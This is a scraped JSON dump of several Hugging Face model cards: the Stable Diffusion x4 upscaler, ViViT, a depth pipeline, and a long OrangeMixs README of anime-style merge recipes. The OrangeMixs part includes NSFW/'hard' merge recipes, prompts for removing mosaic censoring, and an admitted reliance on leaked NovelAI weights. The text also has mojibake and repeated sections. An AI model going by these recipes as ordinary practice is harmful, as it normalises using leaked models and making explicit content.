Computer Vision and Pattern Recognition (CVPR)},\nmonth     = {June},\nyear      = {2022},\npages     = {10684-10695}\n}\nExamples\nUsing the ü§ó's Diffusers library to run Stable Diffusion 2 in a simple and efficient manner.\npip install diffusers transformers accelerate scipy safetensors\nimport requests\nfrom PIL import Image\nfrom io import BytesIO\nfrom diffusers import StableDiffusionUpscalePipeline\nimport torch\n# load model and scheduler\nmodel_id = \"stabilityai/stable-diffusion-x4-upscaler\"\npipeline = StableDiffusionUpscalePipeline.from_pretrained(model_id, torch_dtype=torch.float16)\npipeline = pipeline.to(\"cuda\")\n# let's download an  image\nurl = \"https://huggingface.co/datasets/hf-internal-testing/diffusers-images/resolve/main/sd2-upscale/low_res_cat.png\"\nresponse = requests.get(url)\nlow_res_img = Image.open(BytesIO(response.content)).convert(\"RGB\")\nlow_res_img = low_res_img.resize((128, 128))\nprompt = \"a white cat\"\nupscaled_image = pipeline(prompt=prompt, image=low_res_img).images[0]\nupscaled_image.save(\"upsampled_cat.png\")\nNotes:\nDespite not being a dependency, we highly recommend you to install xformers for memory efficient attention (better performance)\nIf you have low GPU RAM available, make sure to add a pipe.enable_attention_slicing() after sending it to cuda for less VRAM usage (to the cost of speed)\nUses\nDirect Use\nThe model is intended for research purposes only. Possible research areas and tasks include\nSafe deployment of models which have the potential to generate harmful content.\nProbing and understanding the limitations and biases of generative models.\nGeneration of artworks and use in design and other artistic processes.\nApplications in educational or creative tools.\nResearch on generative models.\nExcluded uses are described below.\nMisuse, Malicious Use, and Out-of-Scope Use\nNote: This section is originally taken from the DALLE-MINI model card, was used for Stable Diffusion v1, but applies in the same way to Stable Diffusion v2.\nThe model should not be used to intentionally create or disseminate images that create hostile or alienating environments for people. This includes generating images that people would foreseeably find disturbing, distressing, or offensive; or content that propagates historical or current stereotypes.\nOut-of-Scope Use\nThe model was not trained to be factual or true representations of people or events, and therefore using the model to generate such content is out-of-scope for the abilities of this model.\nMisuse and Malicious Use\nUsing the model to generate content that is cruel to individuals is a misuse of this model. This includes, but is not limited to:\nGenerating demeaning, dehumanizing, or otherwise harmful representations of people or their environments, cultures, religions, etc.\nIntentionally promoting or propagating discriminatory content or harmful stereotypes.\nImpersonating individuals without their consent.\nSexual content without consent of the people who might see it.\nMis- and disinformation\nRepresentations of egregious violence and gore\nSharing of copyrighted or licensed material in violation of its terms of use.\nSharing content that is an alteration of copyrighted or licensed material in violation of its terms of use.\nLimitations and Bias\nLimitations\nThe model does not achieve perfect photorealism\nThe model cannot render legible text\nThe model does not perform well on more difficult tasks which involve compositionality, such as rendering an image corresponding to ‚ÄúA red cube on top of a blue sphere‚Äù\nFaces and people in general may not be generated properly.\nThe model was trained mainly with English captions and will not work as well in other languages.\nThe autoencoding part of the model is lossy\nThe model was trained on a subset of the large-scale dataset\nLAION-5B, which contains adult, violent and sexual content. To partially mitigate this, we have filtered the dataset using LAION's NFSW detector (see Training section).\nBias\nWhile the capabilities of image generation models are impressive, they can also reinforce or exacerbate social biases.\nStable Diffusion vw was primarily trained on subsets of LAION-2B(en),\nwhich consists of images that are limited to English descriptions.\nTexts and images from communities and cultures that use other languages are likely to be insufficiently accounted for.\nThis affects the overall output of the model, as white and western cultures are often set as the default. Further, the\nability of the model to generate content with non-English prompts is significantly worse than with English-language prompts.\nStable Diffusion v2 mirrors and exacerbates biases to such a degree that viewer discretion must be advised irrespective of the input or its intent.\nTraining\nTraining Data\nThe model developers used the following dataset for training the model:\nLAION-5B and subsets (details below). The training data is further filtered using LAION's NSFW detector, with a \"p_unsafe\" score of 0.1 (conservative). For more details, please refer to LAION-5B's NeurIPS 2022 paper and reviewer discussions on the topic.\nTraining Procedure\nStable Diffusion v2 is a latent diffusion model which combines an autoencoder with a diffusion model that is trained in the latent space of the autoencoder. During training,\nImages are encoded through an encoder, which turns images into latent representations. The autoencoder uses a relative downsampling factor of 8 and maps images of shape H x W x 3 to latents of shape H/f x W/f x 4\nText prompts are encoded through the OpenCLIP-ViT/H text-encoder.\nThe output of the text encoder is fed into the UNet backbone of the latent diffusion model via cross-attention.\nThe loss is a reconstruction objective between the noise that was added to the latent and the prediction made by the UNet. We also use the so-called v-objective, see https://arxiv.org/abs/2202.00512.\nWe currently provide the following checkpoints:\n512-base-ema.ckpt: 550k steps at resolution 256x256 on a subset of LAION-5B filtered for explicit pornographic material, using the LAION-NSFW classifier with punsafe=0.1 and an aesthetic score >= 4.5.\n850k steps at resolution 512x512 on the same dataset with resolution >= 512x512.\n768-v-ema.ckpt: Resumed from 512-base-ema.ckpt and trained for 150k steps using a v-objective on the same dataset. Resumed for another 140k steps on a 768x768 subset of our dataset.\n512-depth-ema.ckpt: Resumed from 512-base-ema.ckpt and finetuned for 200k steps. Added an extra input channel to process the (relative) depth prediction produced by MiDaS (dpt_hybrid) which is used as an additional conditioning.\nThe additional input channels of the U-Net which process this extra information were zero-initialized.\n512-inpainting-ema.ckpt: Resumed from 512-base-ema.ckpt and trained for another 200k steps. Follows the mask-generation strategy presented in LAMA which, in combination with the latent VAE representations of the masked image, are used as an additional conditioning.\nThe additional input channels of the U-Net which process this extra information were zero-initialized. The same strategy was used to train the 1.5-inpainting checkpoint.\nx4-upscaling-ema.ckpt: Trained for 1.25M steps on a 10M subset of LAION containing images >2048x2048. The model was trained on crops of size 512x512 and is a text-guided latent upscaling diffusion model.\nIn addition to the textual input, it receives a noise_level as an input parameter, which can be used to add noise to the low-resolution input according to a predefined diffusion schedule.\nHardware: 32 x 8 x A100 GPUs\nOptimizer: AdamW\nGradient Accumulations: 1\nBatch: 32 x 8 x 2 x 4 = 2048\nLearning rate: warmup to 0.0001 for 10,000 steps and then kept constant\nEvaluation Results\nEvaluations with different classifier-free guidance scales (1.5, 2.0, 3.0, 4.0,\n5.0, 6.0, 7.0, 8.0) and 50 steps DDIM sampling steps show the relative improvements of the checkpoints:\nEvaluated using 50 DDIM steps and 10000 random prompts from the COCO2017 validation set, evaluated at 512x512 resolution.  Not optimized for FID scores.\nEnvironmental Impact\nStable Diffusion v1 Estimated Emissions\nBased on that information, we estimate the following CO2 emissions using the Machine Learning Impact calculator presented in Lacoste et al. (2019). The hardware, runtime, cloud provider, and compute region were utilized to estimate the carbon impact.\nHardware Type: A100 PCIe 40GB\nHours used: 200000\nCloud Provider: AWS\nCompute Region: US-east\nCarbon Emitted (Power consumption x Time x Carbon produced based on location of power grid): 15000 kg CO2 eq.\nCitation\n@InProceedings{Rombach_2022_CVPR,\nauthor    = {Rombach, Robin and Blattmann, Andreas and Lorenz, Dominik and Esser, Patrick and Ommer, Bj\\\"orn},\ntitle     = {High-Resolution Image Synthesis With Latent Diffusion Models},\nbooktitle = {Proceedings of the IEEE/CVF Conference on Computer Vision and Pattern Recognition (CVPR)},\nmonth     = {June},\nyear      = {2022},\npages     = {10684-10695}\n}\nThis model card was written by: Robin Rombach, Patrick Esser and David Ha and is based on the Stable Diffusion v1 and DALL-E Mini model card.",
    "google/vivit-b-16x2-kinetics400": "ViViT (Video Vision Transformer)\nModel description\nIntended uses & limitations\nHow to use\nBibTeX entry and citation info\nViViT (Video Vision Transformer)\nViViT model as introduced in the paper ViViT: A Video Vision Transformer by Arnab et al. and first released in this repository.\nDisclaimer: The team releasing ViViT did not write a model card for this model so this model card has been written by the Hugging Face team.\nModel description\nViViT is an extension of the Vision Transformer (ViT) to video.\nWe refer to the paper for details.\nIntended uses & limitations\nThe model is mostly meant to intended to be fine-tuned on a downstream task, like video classification. See the model hub to look for fine-tuned versions on a task that interests you.\nHow to use\nFor code examples, we refer to the documentation.\nBibTeX entry and citation info\n@misc{arnab2021vivit,\ntitle={ViViT: A Video Vision Transformer},\nauthor={Anurag Arnab and Mostafa Dehghani and Georg Heigold and Chen Sun and Mario Luƒçiƒá and Cordelia Schmid},\nyear={2021},\neprint={2103.15691},\narchivePrefix={arXiv},\nprimaryClass={cs.CV}\n}",
    "haweralzaer/impainting": "No model card",
    "carsonkatri/stable-diffusion-2-depth-diffusers": "This model is converted from stable-diffusion-2-depth using the conversion script from ü§ó Diffusers.\nYou can use it with the pipeline here: https://gist.github.com/carson-katri/f51532b9d5162928d5cacbaee081a799\n# class StableDiffusionDepthPipeline: ...\nfrom PIL import Image\nmodel_id = \"carsonkatri/stable-diffusion-2-depth-diffusers\"\n# Use the pipeline from this GH Gist: https://gist.github.com/carson-katri/f51532b9d5162928d5cacbaee081a799\npipe = StableDiffusionDepthPipeline.from_pretrained(model_id)\npipe = pipe.to(\"cuda\")\nimage = pipe(\nprompt=\"a photo of a stormtrooper from star wars\",\ndepth_image=Image.open('depth.png'), # Black and white depth map\nimage=Image.open(\"emad.png\"), # Optional init image and strength.\nwidth=768,\nheight=512\n).images[0]\nimage.save('stormtrooper.png')",
    "WarriorMama777/OrangeMixs": "OrangeMixs\nUPDATE NOTE / How to read this README\nHow to read this README\nUPDATE NOTE\nGradio\nTable of Contents\nReference\nLicence\nTerms of use\nDisclaimer\nHow to download\nBatch Download\nBatch Download (Advanced)\nSelect and download\nModel Detail & Merge Recipes\nVividOrangeMix (VOM)\nVividOrangeMix\nVividOrangeMix_NSFW / Hard\nInstructions\nAbyssOrangeMix3 (AOM3)\nAbout\nMore feature\nVariations / Sample Gallery\nDescription for enthusiast\nAbyssOrangeMix2 (AOM2)\nAbyssOrangeMix2_sfw (AOM2s)\nAbyssOrangeMix2_nsfw (AOM2n)\nAbyssOrangeMix2_hard (AOM2h)\nEerieOrangeMix (EOM)\nEerieOrangeMix (EOM1)\nEerieOrangeMix2 (EOM2)\nModels Comparison\nAbyssOrangeMix (AOM)\nAbyssOrangeMix_base (AOMb)\nAbyssOrangeMix_Night (AOMn)\nAbyssOrangeMix_half (AOMh)\nAbyssOrangeMix (AOM)\nElyOrangeMix (ELOM)\nElyOrangeMix (ELOM)\nElyOrangeMix_half (ELOMh)\nElyNightOrangeMix (ELOMn)\nBloodOrangeMix (BOM)\nBloodOrangeMix (BOM)\nBloodOrangeMix_half (BOMh)\nBloodNightOrangeMix (BOMn)\nElderOrangeMix\nTroubleshooting\nFAQ and Tips (üêàMEME ZONEü¶ê)\nOrangeMixs\n\"OrangeMixs\" shares various Merge models that can be used with StableDiffusionWebui:Automatic1111 and others.\nMaintain a repository for the following purposes.\nto provide easy access to models commonly used in the Japanese community.The Wisdom of the Anonsüíé\nAs a place to upload my merge models when I feel like it.\nHero image prompts(AOM3B2):https://majinai.art/ja/i/jhw20Z_\nUPDATE NOTE / How to read this README\nHow to read this README\nRead the ToC as release notes.Sections are in descending order. The order within the section is ascending. It is written like SNS.\nUPDATE NOTE\nView the repository history when you need to check the full history.\nUPDATE NOTE\n2023-02-27: Add AOM3A1B\n2023-03-10: Model name fix\nI found that I abbreviated the model name too much, so that when users see illustrations using OrangeMixs models on the web, they cannot reach them in their searches.\nTo make the specification more search engine friendly, I renamed it to \"ModelName + (orangemixs)\".\n2023-03-11: Change model name : () to _\nChanged to _ because an error occurs when using () in the Cloud environment(e.g.:paperspace).\n\"ModelName + _orangemixs\"\n2023-04-01: Added description of AOM3A1 cursed by Dreamlike\n2023-06-27: Added AOM3B2. Removed Terms of Service.\n2023-11-25: Add VividOrangeMix (nonlabel, NSFW, Hard)\n2023-06-27: Added AOM3B2. Removed Terms of Service.\n2023-11-25: Add VividOrangeMix (nonlabel, NSFW, Hard)\n2024-01-07: Fix repo & Done upload VividOrangeMixs\nGradio\nWe support a Gradio Web UI to run OrangeMixs:\nTable of Contents\nOrangeMixs\nUPDATE NOTE / How to read this README\nHow to read this README\nUPDATE NOTE\nGradio\nTable of Contents\nReference\nLicence\nTerms of use\nDisclaimer\nHow to download\nBatch Download\nBatch Download (Advanced)\nSelect and download\nModel Detail & Merge Recipes\nVividOrangeMix (VOM)\nVividOrangeMix\nVividOrangeMix_NSFW / Hard\nInstructions\nAbyssOrangeMix3 (AOM3)\nAbout\nMore feature\nVariations / Sample Gallery\nAOM3\nAOM3A1\nAOM3A2\nAOM3A3\nAOM3A1B\nAOM3B2\nAOM3B3\nAOM3B4\nAOM3B3\nAOM3B4\nDescription for enthusiast\nAbyssOrangeMix2 (AOM2)\nAbyssOrangeMix2_sfw (AOM2s)\nAbyssOrangeMix2_nsfw (AOM2n)\nAbyssOrangeMix2_hard (AOM2h)\nEerieOrangeMix (EOM)\nEerieOrangeMix (EOM1)\nEerieOrangeMix_base (EOM1b)\nEerieOrangeMix_Night (EOM1n)\nEerieOrangeMix_half (EOM1h)\nEerieOrangeMix (EOM1)\nEerieOrangeMix2 (EOM2)\nEerieOrangeMix2_base (EOM2b)\nEerieOrangeMix2_night (EOM2n)\nEerieOrangeMix2_half (EOM2h)\nEerieOrangeMix2 (EOM2)\nModels Comparison\nAbyssOrangeMix (AOM)\nAbyssOrangeMix_base (AOMb)\nAbyssOrangeMix_Night (AOMn)\nAbyssOrangeMix_half (AOMh)\nAbyssOrangeMix (AOM)\nElyOrangeMix (ELOM)\nElyOrangeMix (ELOM)\nElyOrangeMix_half (ELOMh)\nElyNightOrangeMix (ELOMn)\nBloodOrangeMix (BOM)\nBloodOrangeMix (BOM)\nBloodOrangeMix_half (BOMh)\nBloodNightOrangeMix (BOMn)\nElderOrangeMix\nTroubleshooting\nFAQ and Tips (üêàMEME ZONEü¶ê)\nReference\n+/hdg/ Stable Diffusion Models Cookbook - https://rentry.org/hdgrecipes#g-anons-unnamed-mix-e93c3bf7\nModel names are named after Cookbook precedentsüçä\nLicence\nThis model is open access and available to all, with a CreativeML OpenRAIL-M license further specifying rights and usage. The CreativeML OpenRAIL License specifies:\nYou can't use the model to deliberately produce nor share illegal or harmful outputs or content\nThe authors claims no rights on the outputs you generate, you are free to use them and are accountable for their use which must not go against the provisions set in the license\nYou may re-distribute the weights and use the model commercially and/or as a service. If you do, please be aware you have to include the same use restrictions as the ones in the license and share a copy of the CreativeML OpenRAIL-M to all your users (please read the license entirely and carefully) Please read the full license here Ôºöhttps://huggingface.co/spaces/CompVis/stable-diffusion-license\nTerms of use\n- Clearly indicate where modifications have been made.If you used it for merging, please state what steps you took to do so.\nRemoved terms of use. 2023-06-28Freedom. If you share your recipes, Marge swamp will be fun.\nDisclaimer\nREAD MORE: Disclaimer\nThe user has complete control over whether or not to generate NSFW content, and the user's decision to enjoy either SFW or NSFW is entirely up to the user.The learning model does not contain any obscene visual content that can be viewed with a single click.The posting of the Learning Model is not intended to display obscene material in a public place.\nIn publishing examples of the generation of copyrighted characters, I consider the following cases to be exceptional cases in which unauthorised use is permitted.\n\"when the use is for private use or research purposes; when the work is used as material for merchandising (however, this does not apply when the main use of the work is to be merchandised); when the work is used in criticism, commentary or news reporting; when the work is used as a parody or derivative work to demonstrate originality.\"\nIn these cases, use against the will of the copyright holder or use for unjustified gain should still be avoided, and if a complaint is lodged by the copyright holder, it is guaranteed that the publication will be stopped as soon as possible.\nI would also like to note that I am aware of the fact that many of the merged models use NAI, which is learned from Danbooru and other sites that could be interpreted as illegal, and whose model data itself is also a leak, and that this should be watched carefully. I believe that the best we can do is to expand the possibilities of GenerativeAI while protecting the works of illustrators and artists.\nHow to download\nBatch Download\n‚ö†Deprecated: Orange has grown too huge. Doing this will kill your storage.\ninstall Git\ncreate a folder of your choice and right click ‚Üí \"Git bash here\" and open a gitbash on the folder's directory.\nrun the following commands in order.\ngit lfs install\ngit clone https://huggingface.co/WarriorMama777/OrangeMixs\ncomplete\nBatch Download (Advanced)\nAdvanced: (When you want to download only selected directories, not the entire repository.)\nToggle: How to Batch Download (Advanced)\nRun the command git clone --filter=tree:0 --no-checkout https://huggingface.co/WarriorMama777/OrangeMixs to clone the huggingface repository. By adding the --filter=tree:0 and --no-checkout options, you can download only the file names without their contents.\ngit clone --filter=tree:0 --no-checkout https://huggingface.co/WarriorMama777/OrangeMixs\nMove to the cloned directory with the command cd OrangeMixs.\ncd OrangeMixs\nEnable sparse-checkout mode with the command git sparse-checkout init --cone. By adding the --cone option, you can achieve faster performance.\ngit sparse-checkout init --cone\nSpecify the directory you want to get with the command git sparse-checkout add <directory name>. For example, if you want to get only the Models/AbyssOrangeMix3 directory, enter git sparse-checkout add Models/AbyssOrangeMix3.\ngit sparse-checkout add Models/AbyssOrangeMix3\nDownload the contents of the specified directory with the command git checkout main.\ngit checkout main\nThis completes how to clone only a specific directory. If you want to add other directories, run git sparse-checkout add <directory name> again.\nSelect and download\nGo to the Files and vaersions tab.\nselect the model you want to download\ndownload\ncomplete\nModel Detail & Merge Recipes\nVividOrangeMix (VOM)\nPrompt: https://majinai.art/ja/i/VZ9dNoI\nCivitai: https://civitai.com/models/196585?modelVersionId=221033\n2023-11-25\nVividOrangeMix\n‚ñºAbout\n\"VividOrangeMix is a StableDiffusion model created for fans seeking vivid, flat, anime-style illustrations. With rich, bold colors and flat shading, it embodies the style seen in anime and manga.‚Äù\nOne of the versions of OrangeMixs, AbyssOrangeMix1~3 (AOM), has improved the anatomical accuracy of the human body by merging photorealistic models, but I was dissatisfied with the too-realistic shapes and shadows.VividOrangeMix is a model that has been adjusted to solve this problem.\n‚ñºSample Gallery\nDefault\nLoRA\nVividOrangeMix_NSFW / Hard\n‚ñºAbout\nVividOrangeMix NSFW/Hard is, as before, a model that Merges elements of NAI and Gape by U-Net Blocks Weight method.\nAs of AOM3, elements of these models should be included, but when I simply merged other models, the elements of the old merge seem to gradually fade away. Also, by merging U-Net Blocks Weight, it is now possible to merge without affecting the design to some extent, but some changes are unavoidable, so I decided to upload it separately as before. .\n‚ñºSample Gallery\n‚ÜêNSFW | Hard‚Üí\nInstructions\n‚ñºTool\nhttps://github.com/hako-mikan/sd-webui-supermerger/\n‚ñºVividOrangeMix\nSTEP: 1 | Base model create\nGO TO AOM3B4 Instructions‚Üì\nSTEP: 2 | Model merge\nModel: A\nModel: B\nModel: C\nInterpolation Method\nWeight\nMerge Name\nAOM3B4\nAnimelike_2D_Pruend_fp16\nsum @ 0.3\nVividOrangeMix\n‚ñºVividOrangeMix_NSFW\nModel: A\nModel: B\nModel: C\nInterpolation Method\nWeight\nMerge Name\nVividOrangeMix\nNAI full\nNAI sfw\nAdd Difference @ 1.0\n0,0.25,0.25,0.25,0.25,0.25,0,0,0,0,0.25,0.25,0.25,0.25,0.25,0.25,0.25,0.25,0.25,0.2,0.25,0.25,0.25,0.25,0,0\nVividOrangeMix_NSFW\n‚ñºVividOrangeMix_Hard\nModel: A\nModel: B\nModel: C\nInterpolation Method\nWeight\nMerge Name\nVividOrangeMix_NSFW\ngape60\nNAI full\nAdd Difference @ 1.0\n0.0,0.25,0.25,0.25,0.25,0.25,0.0,0.0,0.0,0.0,0.25,0.25,0.25,0.25,0.25,0.25,0.25,0.25,0.25,0.25,0.25,0.25,0.25,0.25,0.0,0.0\nVividOrangeMix_Hard\nAbyssOrangeMix3 (AOM3)\n‚Äï‚ÄïEveryone has different ‚ÄúABYSS‚Äù!\n‚ñºAbout\nThe main model, \"AOM3 (AbyssOrangeMix3)\", is a purely upgraded model that improves on the problems of the previous version, \"AOM2\". \"AOM3\" can generate illustrations with very realistic textures and can generate a wide variety of content. There are also three variant models based on the AOM3 that have been adjusted to a unique illustration style. These models will help you to express your ideas more clearly.\n‚ñºLinks\n[‚ö†NSFW] Civitai: AbyssOrangeMix3 (AOM3) | Stable Diffusion Checkpoint | https://civitai.com/models/9942/abyssorangemix3-aom3\nAbout\nFeatures: high-quality, realistic textured illustrations can be generated.There are two major changes from AOM2.\n1: Models for NSFW such as _nsfw and _hard have been improved: the models after nsfw in AOM2 generated creepy realistic faces, muscles and ribs when using Hires.fix, even though they were animated characters. These have all been improved in AOM3.\ne.g.: explanatory diagram by MEME : GO TO MEME ZONE‚Üì\n2: sfw/nsfw merged into one model. Originally, nsfw models were separated because adding NSFW content (models like NAI and gape) would change the face and cause the aforementioned problems. Now that those have been improved, the models can be packed into one.In addition, thanks to excellent extensions such as ModelToolkit, the model file size could be reduced (1.98 GB per model).\nMore feature\nIn addition, these U-Net Blocks Weight Merge models take numerous steps but are carefully merged to ensure that mutual content is not overwritten.\n(Of course, all models allow full control over adult content.)\nüîê When generating illustrations for the general public: write \"nsfw\" in the negative prompt field\nüîû When generating adult illustrations: \"nsfw\" in the positive prompt field -> It can be generated without putting it in. If you include it, the atmosphere will be more NSFW.\nVariations / Sample Gallery\nüößEditingüöß\nAOM3\n‚ñºAOM3\n(Actually, this gallery doesn't make much sense since AOM3 is mainly an improvement of the NSFW part üòÇ  ...But we can confirm that the picture is not much different from AOM2sfw.)\nAOM3A1\n‚õîOnly this model (AOM3A1) includes ChilloutMix. The curse of the DreamLike license. In other words, only AOM3A1 is not available for commercial use. I recommend AOM3A1B instead.‚õî\nGO TO MEME ZONE‚Üì\nFeatures: Anime like illustrations with flat paint. Cute enough as it is, but I really like to apply LoRA of anime characters to this model to generate high quality anime illustrations like a frame from a theatre version.\n‚ñºA1\n¬©\n(1)¬©Yurucamp: Inuyama Aoi, (2)¬©The Quintessential Quintuplets: Nakano Yotsuba, (3)¬©Sailor Moon: Mizuno Ami/SailorMercury\nAOM3A2\nüößEditingüöß\nFeatures: Oil paintings like style artistic illustrations and stylish background depictions. In fact, this is mostly due to the work of Counterfeit 2.5, but the textures are more realistic thanks to the U-Net Blocks Weight Merge.\nAOM3A3\nüößEditingüöß\nFeatures: Midpoint of artistic and kawaii. the model has been tuned to combine realistic textures, a artistic style that also feels like an oil colour style, and a cute anime-style face. Can be used to create a wide range of illustrations.\nAOM3A1B\nAOM3A1B added. This model is my latest favorite. I recommend it for its moderate realism, moderate brush touch, and moderate LoRA conformity.The model was merged by mistakenly selecting 'Add sum' when 'Add differences' should have been selected in the AOM3A3AOM3A2 recipe. It was an unintended merge, but we share it because the illustrations produced are consistently good results.The model was merged by mistakenly selecting 'Add sum' when 'Add differences' should have been selected in the AOM3A3AOM3A2 recipe. It was an unintended merge, but we share it because the illustrations produced are consistently good results.In my review, this is an illustration style somewhere between AOM3A1 and A3.\n‚ñºA1B\nMeisho Doto (umamusume): https://civitai.com/models/11980/meisho-doto-umamusume\nTrain and Girl: JR East E235 series / train interior\n¬©\n¬©umamusume: Meisho Doto, ¬©Girls und Panzer: Nishizumi Miho,¬©IDOLM@STER: Sagisawa Fumika\nAOM3B2\nmy newest toy.\nJust AOM3A1B + BreakdomainM21: 0.4So this model is somewhat of a troll model.\nI would like to create an improved DiffLoRAKit_v2 based on this.Upload for access for research etc. 2023-06-27\nSample image prompts\nMaid\nYotsuba: https://majinai.art/ja/i/f-O4wau\nInuko in cafe: https://majinai.art/ja/i/Cj-Ar9C\nbathroom: https://majinai.art/ja/i/XiSj5K6\nAOM3B3\n2023-09-25\nThis is a derivative model of AOM3B2.\nI merged some nice models and also merged some LoRAs to further adjust the color and painting style.\n‚óÜInstructions:\n‚ñºTool\nSupermerger\n‚ñºModel Merge\nAOM3B2+Mixprov4+BreakdomainAnime\ntriple sum : 0.3, 0.3 | mode:normal\nÔºã\n‚ñºLoRA Merge\nloraH(DiffLoRA)_FaceShadowTweaker_v1_dim4:-2,nijipretty_20230624235607:0.1,MatureFemale_epoch8:0.1,colorful_V1_lbw:0.5\nAOM3B4\n‚ñºAbout\nFix AOM3B3\n‚ñºInstructions:\nUSE: https://github.com/hako-mikan/sd-webui-supermerger/\nSTEP: 1 | Model merge\nModel: A\nModel: B\nModel: C\nInterpolation Method\nWeight\nMerge Name\nAOM3B2\nMixprov4\nBreakdomainAnime\ntriple sum @ 0.3, 0.3, mode:normal\ntemp01\nSTEP: 2 | LoRA Merge\nColor fix\nModel: A\nModel: B\nModel: C\nInterpolation Method\nWeight\nMerge Name\ntemp01\ncolorful_V1_lbw\nsum @ 0.45\nAOM3B4\n‚öìGO TO VividOrangeMix Instructions‚Üë\nAOM3B3\n2023-09-25\nThis is a derivative model of AOM3B2.\nI merged some nice models and also merged some LoRAs to further adjust the color and painting style.\n‚óÜInstructions:\n‚ñºTool\nSupermerger\n‚ñºModel Merge\nAOM3B2+Mixprov4+BreakdomainAnime\ntriple sum : 0.3, 0.3 | mode:normal\nÔºã\n‚ñºLoRA Merge\nloraH(DiffLoRA)_FaceShadowTweaker_v1_dim4:-2,nijipretty_20230624235607:0.1,MatureFemale_epoch8:0.1,colorful_V1_lbw:0.5\nAOM3B4\n‚ñºAbout\nFix AOM3B3\n‚ñºInstructions:\nUSE: https://github.com/hako-mikan/sd-webui-supermerger/\nSTEP: 1 | Model merge\nModel: A\nModel: B\nModel: C\nInterpolation Method\nWeight\nMerge Name\nAOM3B2\nMixprov4\nBreakdomainAnime\ntriple sum @ 0.3, 0.3, mode:normal\ntemp01\nSTEP: 2 | LoRA Merge\nColor fix\nModel: A\nModel: B\nModel: C\nInterpolation Method\nWeight\nMerge Name\ntemp01\ncolorful_V1_lbw\nsum @ 0.45\nAOM3B4\n‚öìGO TO VividOrangeMix Instructions‚Üë\nDescription for enthusiast\nAOM3 was created with a focus on improving the nsfw version of AOM2, as mentioned above.The AOM3 is a merge of the following two models into AOM2sfw using U-Net Blocks Weight Merge, while extracting only the NSFW content part.(1) NAI: trained in Danbooru(2)gape: Finetune model of NAI trained on Danbooru's very hardcore NSFW content.In other words, if you are looking for something like AOM3sfw, it is AOM2sfw.The AOM3 was merged with the NSFW model while removing only the layers that have a negative impact on the face and body.   However, the faces and compositions are not an exact match to AOM2sfw.AOM2sfw is sometimes superior when generating SFW content. I recommend choosing according to the intended use of the illustration.See below for a comparison between AOM2sfw and AOM3.\n‚ñºA summary of the AOM3 work is as follows\ninvestigated the impact of the NAI and gape layers as AOM2 _nsfw onwards is crap.\ncut face layer: OUT04 because I want realistic faces to stop ‚Üí Failed. No change.\ngapeNAI layer investigationÔΩú  a. (IN05-08 (especially IN07) | Change the illustration   significantly. Noise is applied, natural colours are lost, shadows die, and we can see that the IN deep layer is a layer of light and shade.  b. OUT03-05(?) | likely to be sexual section/NSFW layer.Cutting here will kill the NSFW.  c. OUT03,OUT04ÔΩúNSFW effects are in(?). e.g.: spoken hearts, trembling, motion lines, etc...  d. OUT05ÔΩúThis is really an NSFW switch. All the \"NSFW atmosphere\" is in here. Facial expressions, Heavy breaths, etc...  e. OUT10-11ÔΩúPaint layer. Does not affect detail, but does have an extensive impact.\n(mass production of rubbish from here...)\ncut IN05-08 and merge NAIgape with flat parameters ‚Üí avoided creepy muscles and real faces. Also, merging NSFW models stronger has less impact.\nso, cut IN05-08, OUT10-11 and merge NAI+gape with all others 0.5.\n‚Üí AOM3AOM3 roughly looks like this\n‚ñºHow to use\nPrompts\nNegative prompts is As simple as possible is good.  (worst quality, low quality:1.4)\nUsing \"3D\" as a negative will result in a rough sketch style at the \"sketch\" level. Use with caution as it is a very strong prompt.\nHow to avoid Real Face  (realistic, lip, nose, tooth, rouge, lipstick, eyeshadow:1.0), (abs, muscular, rib:1.0),\nHow to avoid Bokeh  (depth of field, bokeh, blurry:1.4)\nHow to remove mosaic: (censored, mosaic censoring, bar censor, convenient censoring, pointless censoring:1.0),\nHow to remove blush: (blush, embarrassed, nose blush, light blush, full-face blush:1.4),\nHow to remove NSFW effects: (trembling, motion lines, motion blur, emphasis lines:1.2),\nüî∞Basic negative prompts sample for Anime girl ‚Üì\nv1nsfw, (worst quality, low quality:1.4), (realistic, lip, nose, tooth, rouge, lipstick, eyeshadow:1.0), (dusty sunbeams:1.0),, (abs, muscular, rib:1.0), (depth of field, bokeh, blurry:1.4),(motion lines, motion blur:1.4), (greyscale, monochrome:1.0), text, title, logo, signature\nv2nsfw, (worst quality, low quality:1.4), (lip, nose, tooth, rouge, lipstick, eyeshadow:1.4), (blush:1.2), (jpeg artifacts:1.4), (depth of field, bokeh, blurry, film grain, chromatic aberration, lens flare:1.0), (1boy, abs, muscular, rib:1.0), greyscale, monochrome, dusty sunbeams,  trembling, motion lines, motion blur, emphasis lines, text, title, logo, signature,\nSampler: ‚ÄúDPM++ SDE Karras‚Äù is good Take your pick\nSteps:\nDPM++ SDE Karras: Test: 12ÔΩû ,illustration: 20ÔΩû\nDPM++ 2M Karras: Test: 20ÔΩû ,illustration: 28ÔΩû\nClipskip: 1 or 2\nCFG: 8 (6ÔΩû12)\nUpscaler :\nDetailed illust ‚Üí Latenet (nearest-exact)  Denoise strength: 0.5 (0.5~0.6)\nSimple upscale: Swin IR, ESRGAN, Remacri etc‚Ä¶  Denoise strength: Can be set low. (0.35~0.6)\nüë©‚Äçüç≥Model details / Recipe\n‚ñºHash(SHA256)\n‚ñºHash(SHA256)\nAOM3.safetensorsD124FC18F0232D7F0A2A70358CDB1288AF9E1EE8596200F50F0936BE59514F6D\nAOM3A1.safetensorsF303D108122DDD43A34C160BD46DBB08CB0E088E979ACDA0BF168A7A1F5820E0\nAOM3A2.safetensors553398964F9277A104DA840A930794AC5634FC442E6791E5D7E72B82B3BB88C3\nAOM3A3.safetensorsEB4099BA9CD5E69AB526FCA22A2E967F286F8512D9509B735C892FA6468767CF\nAOM3A1B.safetensors\n5493A0EC491F5961DBDC1C861404088A6AE9BD4007F6A3A7C5DEE8789CDC1361\nAOM3B2.safetensors\nF553E7BDE46CFE9B3EF1F31998703A640AF7C047B65883996E44AC7156F8C1DB\nAOM3A1B.safetensors\n5493A0EC491F5961DBDC1C861404088A6AE9BD4007F6A3A7C5DEE8789CDC1361\nAOM3B2.safetensors\nF553E7BDE46CFE9B3EF1F31998703A640AF7C047B65883996E44AC7156F8C1DB\n‚ñºUse Models\nAOM2sfw„Äå038ba203d8ba3c8af24f14e01fbb870c85bbb8d4b6d9520804828f4193d12ce9„Äç\nAnythingV3.0 huggingface pruned[2700c435]„Äå543bcbc21294831c6245cd74c8a7707761e28812c690f946cb81fef930d54b5e„Äç\nNovelAI 